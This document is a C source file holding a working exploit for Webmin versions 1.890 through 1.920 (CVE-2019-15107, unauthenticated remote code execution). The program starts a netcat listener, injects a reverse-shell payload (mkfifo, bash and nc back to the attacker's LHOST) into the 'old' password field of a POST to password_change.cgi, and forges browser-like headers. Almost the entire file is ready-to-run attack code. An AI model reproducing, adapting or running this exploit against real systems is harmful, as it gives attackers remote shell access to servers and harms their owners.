//
//   Exploit for Webmin servers versions 1.890 through 1.920.
//
//   CVE: 2019-15107         Unauthenticated Remote Code Execution
//
//   Author: Alberto Almansa - @Hsilyav
//

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <regex.h>
#include <curl/curl.h>
#include <unistd.h> // For execvp function

int is_valid_ip(const char *ip) {
    regex_t regex;
    int reti = regcomp(&regex, "^[0-9.]+$", REG_EXTENDED);
    if (reti) {
        fprintf(stderr, "Could not compile regex\n");
        exit(1);
    }
    reti = regexec(&regex, ip, 0, NULL, 0);
    regfree(&regex);
    return !reti;
}

int is_valid_port(int port) {
    return port >= 1 && port <= 65535;
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        fprintf(stderr, "Usage: exploit <target_host> <target_port> <LHOST> <LPORT>\n");
        return 1;
    }

    char *target_host = argv[1];
    int target_port = atoi(argv[2]);
    char *lhost = argv[3];
    int lport = atoi(argv[4]);

    if (!is_valid_ip(target_host)) {
        printf("The target_host must be a valid IP address.\n");
        return 1;
    }

    if (!is_valid_port(target_port)) {
        printf("The target_port is not in the valid range (1-65535).\n");
        return 1;
    }

    if (!is_valid_ip(lhost)) {
        printf("LHOST must be a valid IP address.\n");
        return 1;
    }

    if (!is_valid_port(lport)) {
        printf("LPORT is not in the valid range (1-65535).\n");
        return 1;
    }

    // Start netcat in listening mode on LPORT
    char lport_str[6];
    snprintf(lport_str, sizeof(lport_str), "%d", lport);
    char *nc_args[] = {"nc", "-lvnp", lport_str, NULL};
    if (fork() == 0) {
        execvp("nc", nc_args);
    }

    // Step 1: Create the "payload" text string
    char payload[256];
    snprintf(payload, sizeof(payload), "rm+/tmp/f%%3Bmkfifo+/tmp/f%%3Bcat+/tmp/f|/bin/bash+-i+2>%%261|nc+%s+%d+>/tmp/f", lhost, lport);
    
    // Step 2: Initialize libcurl
    CURL *curl;
    CURLcode res;
    curl_global_init(CURL_GLOBAL_DEFAULT);
    curl = curl_easy_init();

    if (curl) {
        // Step 3: Send the payload with libcurl and custom headers
        char url[256];
        snprintf(url, sizeof(url), "http://%s:%d/password_change.cgi", target_host, target_port);
        curl_easy_setopt(curl, CURLOPT_URL, url);
        
        struct curl_slist *headers = NULL;
        char host_header[128];
        snprintf(host_header, sizeof(host_header), "Host: %s:%d", target_host, target_port);
        headers = curl_slist_append(headers, host_header);
        headers = curl_slist_append(headers, "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0");
        headers = curl_slist_append(headers, "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8");
        headers = curl_slist_append(headers, "Accept-Language: en-US,en;q=0.5");
        headers = curl_slist_append(headers, "Accept-Encoding: gzip, deflate, br");
        char referer_header[256];
        snprintf(referer_header, sizeof(referer_header), "Referer: http://%s:%d/session_login.cgi", target_host, target_port);
        headers = curl_slist_append(headers, referer_header);
        headers = curl_slist_append(headers, "Content-Type: application/x-www-form-urlencoded");

        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);

        char post_fields[512];
        snprintf(post_fields, sizeof(post_fields), "user=Test&pam=&expired=2&old=%s&new1=test&new2=test", payload);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_fields);

        // Perform the request
        res = curl_easy_perform(curl);

        // Cleanup
        curl_slist_free_all(headers);
        curl_easy_cleanup(curl);
        curl_global_cleanup();

        if (res != CURLE_OK) {
            fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
            return 1;
        }
    } else {
        fprintf(stderr, "Failed to initialize libcurl\n");
        return 1;
    }

    printf("\n[*] Exploit completed.\n");
    return 0;
}
